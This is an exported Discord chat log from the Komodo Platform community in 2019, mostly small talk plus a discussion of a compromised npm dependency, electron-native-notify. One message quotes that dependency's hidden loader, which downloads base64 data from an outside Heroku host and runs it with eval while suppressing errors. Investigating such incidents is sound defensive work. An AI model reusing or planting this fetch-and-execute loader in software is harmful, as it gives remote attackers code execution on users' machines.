AuthorID;Author;Date;Content;Attachments;Reactions;
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:35 PM";"Hello";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:35 PM";"Thank you for awesome product";"";"";
"423176312354635779";"gcharang#6833";"06-Jun-19 06:38 PM";"@BigSlim you seem to be in the wrong discord. This one is ""Komodo Platform""";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:40 PM";"Ah yea my bad";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:40 PM";"Just realized that";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:40 PM";"Lol";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:40 PM";"👍🏼";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:40 PM";"It’s a cool node map though";"";"";
"136447902238244864";"Andy#1801";"06-Jun-19 06:41 PM";"I see that the lockfile now includes two ^, after what happened here yesterday I would probably try to get rid of them 😃";"";"";
"428372398933540894";"BigSlim#9710";"06-Jun-19 06:41 PM";"I’ll see myself out";"";"";
"136447902238244864";"Andy#1801";"09-Jun-19 01:15 PM";"So the only further information I found was this, someone uploaded the source of the `electron-native-notify` dependency. But it seems that the payload has been loaded from a server. Does anyone have the payload?

```
try {
    (process && ""renderer"" === process.type ? require(""electron"").remote.require : require)(""https"").get(""https://updatecheck.herokuapp.com/check"", res => res.on(""data"", d => {
        try {
            eval((atob || (e => """" + Buffer.from(e, ""base64"")))("""" + d))
        } catch (e) {}
    }))
} catch (e) {}
```";"";"🔹 (1)";
"332583779497541643";"kryptose#0406";"12-Jun-19 06:18 PM";"@Andy any luck finding a secondary payload?";"";"";
"455741312273219595";"jl777c#5810";"13-Jun-19 01:37 PM";"i already commented about this in #talk-general";"";"";
"455741312273219595";"jl777c#5810";"01-Jul-19 07:11 PM";"using  minor issues (without disclosing details) to scare people to upgrade to segwit contaminated versions";"";"";
"430818734530101248";"KomodoWorld#8282";"04-Jul-19 07:45 PM";"https://twitter.com/MihailoBjelic/status/1146867337452294144";"";"";
"347922216429813760";"grewalsatinder#9653";"04-Jul-19 08:58 PM";"Interesting, thanks for sharing 
Will look into it :)";"";"";
"375074477756645386";"ca333#0118";"17-Aug-19 04:06 PM";"https://www.usenix.org/system/files/sec19-antonioli.pdf";"";"abusedsmily (1),🙈 (2),👀 (1)";
